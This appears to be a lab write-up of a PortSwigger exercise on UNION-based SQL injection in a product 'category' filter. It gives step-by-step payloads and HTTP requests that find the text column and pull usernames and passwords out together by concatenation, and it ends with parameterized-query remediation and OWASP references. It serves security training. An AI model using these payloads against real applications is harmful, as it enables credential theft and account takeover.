
---
# SQL Injection in Product Filtering allows Retrieval of Multiple Values in a Single Column

## 1. Executive Summary

A SQL injection vulnerability exists in the product category filtering functionality, allowing an attacker to inject a `UNION SELECT` statement through the `category` parameter. The original query returns two columns, but only one column accepts text, preventing the attacker from directly retrieving both the username and password fields separately. By concatenating multiple database values into a single text column, an attacker can retrieve usernames and passwords together from the `users` table.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection — UNION-based Data Extraction / Multiple Values in a Single Column
    
- **Target Endpoint/URL:** `/filter`
    
- **Affected Parameter(s):** `category`
    
- **Authentication Level Required:** Unauthenticated
    

The application incorporates the `category` parameter into a backend SQL query without proper parameterization.

The original query returns **two columns**, but only the **second column accepts text data**.

The following payload confirms this:

```
'+UNION+SELECT+NULL,'abc'--
```

Because only one column can contain text, the attacker cannot directly use:

```
UNION SELECT username, password FROM users
```

Instead, multiple values can be concatenated into the single text-compatible column:

```
username || '~' || password
```

The `||` operator concatenates strings, while `~` acts as a delimiter between the username and password.

## 3. Steps to Reproduce (STR)

### Step 1 — Intercept the request

1. Access the PortSwigger lab.
    
2. Navigate to the product listing page.
    
3. Select a product category.
    
4. Intercept the request using Burp Suite.
    
5. Locate the `category` parameter.
    

### Step 2 — Determine the number of columns and identify the text column

6. Test the injection point using:
    

```
'+UNION+SELECT+NULL,NULL--
```

7. Confirm that the original query returns **two columns**.
    
8. Test whether the first column accepts text:
    

```
'+UNION+SELECT+'abc',NULL--
```

9. Observe that the request produces an error because the first column is not compatible with text.
    
10. Test the second column:
    

```
'+UNION+SELECT+NULL,'abc'--
```

11. Observe that the request succeeds and `abc` appears in the response.
    
12. This confirms that:
    
    - The query returns two columns.
        
    - Only the second column accepts text.
        

### Step 3 — Concatenate multiple database values

13. Since only one column can contain text, combine the username and password into a single value.
    
14. Use the following payload:
    

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

15. Send the request.
    
16. The database concatenates the username, `~` delimiter, and password into one string.
    
17. Observe the application's response.
    
18. The response contains usernames and passwords separated by `~`.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

#### Identify the text-compatible column

```
GET /filter?category='+UNION+SELECT+NULL,'abc'-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The injected query is conceptually:

```
SELECT ...
UNION
SELECT NULL, 'abc'
--';
```

The response contains:

```
abc
```

This confirms that the **second column** accepts text.

#### Retrieve multiple values through the text column

```
GET /filter?category='+UNION+SELECT+NULL,username%7C%7C%27~%27%7C%7Cpassword+FROM+users-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The injected SQL is conceptually:

```
SELECT ...
UNION
SELECT NULL,
       username || '~' || password
FROM users
--';
```

The `||` operator concatenates the values:

```
username + "~" + password
```

The response may contain data in the following format:

```
administrator~<password>
user1~<password>
user2~<password>
```

The `~` character allows the attacker to distinguish the username from the password.

### Evidence (Screenshots/Video)



## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can exploit SQL injection to retrieve multiple database values through a single text-compatible column. In this lab, usernames and passwords from the `users` table are concatenated and returned in the application response.
    
- **Business Impact:** Unauthorized disclosure of authentication credentials can lead to account compromise. If privileged credentials are exposed, an attacker may obtain administrative access and potentially compromise sensitive application functionality and data.
    

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements so that user-controlled input cannot alter the structure of the SQL query.
    

For example:

```
cursor.execute(
    "SELECT * FROM products WHERE category = %s",
    (category,)
)
```

Additional defenses include:

- Use prepared statements/parameterized queries.
    
- Never concatenate user-controlled input into SQL statements.
    
- Apply least-privilege permissions to the database account.
    
- Restrict database access to only the tables required by the application.
    
- Store passwords using strong, salted password-hashing algorithms rather than plaintext.
    
- Avoid returning database query results or detailed SQL errors to unauthorized users.
    
- Implement appropriate server-side input validation as defense in depth.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - PortSwigger Web Security Academy — SQL Injection UNION Attacks